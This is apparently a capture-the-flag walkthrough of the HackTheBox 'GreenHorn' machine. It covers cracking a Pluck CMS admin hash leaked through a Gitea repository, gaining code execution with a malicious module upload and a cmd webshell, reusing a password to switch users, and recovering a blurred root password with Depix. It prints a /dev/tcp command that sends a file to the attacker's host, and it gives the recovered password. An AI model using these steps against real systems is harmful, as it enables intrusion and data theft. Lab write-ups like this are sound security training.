
starting with nmap 
`
```
sudo  nmap -sC -sV -p- -oN greenHorn -T4 10.10.11.25
```
 ![[Pasted image 20240722002947.png]]

so we got 2 websites , one hosted on the port 80 and the other on the port 3000
![[Pasted image 20240722003219.png]]


`
on the port 3000 , we got gitea , with a public repos contains the source code of ==pluck cms==
on the other port we found the ==pluck cms==

![[Pasted image 20240722003527.png]]

from the fisrt look , I assume that this websites is the same one as the one in the ==gitea repo ==

so let's take look at the source code , quick review of the code 

this file got my attention http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/login.php 

```
else {

require_once 'data/settings/pass.php';

  

//Check if we're already logged in. First, get the token.

require_once 'data/settings/token.php';
```

let's check the ==data/settings/pass.php== 
```
<?php

$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';

?>
```
this files returns a hash to the  ==login.php== file 

then the cms generate a hash based on the user input and stored it in  ==$pass==
```
  

//If password has been sent, and the bogus input is empty, MD5-encrypt password.

if (isset($_POST['submit']) && empty($_POST['bogus'])) {

$pass = hash('sha512', $cont1);
```
after that he compares the ==\$ww (hash returned from pass.php)== with the ==\$pass==
to confirm that the password is correct
```
  

//If password is correct, save session-cookie.

if (($pass == $ww) && (!isset($login_error))) {

$_SESSION[$token] = 'pluck_loggedin';
```

if we crack the hash on the pass.==php== we will get access to the ==cms==  , since the  hash is ==SHA512== , I will try to crack it using 
https://crackstation.net/

![[Pasted image 20240722011750.png]]
![[Pasted image 20240722012056.png]]

the CMS is on version ==4.7.18== , I quick google search lead me to https://www.exploit-db.com/exploits/51592

after reading the script .
the scenario is the following :
```
user with admin privilege can upload a module (module is just zip with php files) using http://target/pluck/admin.php?action=installmodule
, then we can run those files , since we control those files we can use them to get rce .
```

first I will create a zip with two files ==poc.php,rce.php== 
![[Pasted image 20240722012944.png]]
```
zip rce.zip poc.php rce.php
```
![[Pasted image 20240722013106.png]]

![[Pasted image 20240722013302.png]]

http://greenhorn.htb/data/modules/rce/poc.php
![[Pasted image 20240722013344.png]]

http://greenhorn.htb/data/modules/rce/rce.php?cmd=id
![[Pasted image 20240722013526.png]]

let's get rev shell now
![[Pasted image 20240722014725.png]]

![[Pasted image 20240722014758.png]]

we have 3 users on this machines
```
cat  /etc/passwd | grep sh$
```
![[Pasted image 20240722014835.png]]

I tried to reuse the password of the website , against users and I am ==junior== now!!
```
su junior
```

there's a pdf on ==junior's home== 
![[Pasted image 20240722015126.png]]

let's transfer it to our machine  to check it 
```
on the target :
		cat 'Using OpenVAS.pdf' > /dev/tcp/10.10.14.234/1337
on the attacker machine :
		nc -nvlp 1337 > openvas.pdf
```
![[Pasted image 20240722015319.png]]

there's a hidden password in this pdf , we need to unblur that shit
![[Pasted image 20240722015603.png]]

at this point I was stuck , so I ask for hints from the HTB discord server 
we need tools like https://github.com/spipm/Depix to un-blur the password

but first we need to convert the pdf to png (wasn't lucky with taking screenshots),
using websites like https://pdfcandy.com will be enough 

after generating the image I use  ==Depix tool== to generate un-blurred  image
```
python3 depix.py -p  ../OpenVas.png  -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o root.png
```

and I got this 
![[root.png]]

```
sidefromsidetheothersidesidefromsidetheotherside
```
![[Pasted image 20240722020616.png]]
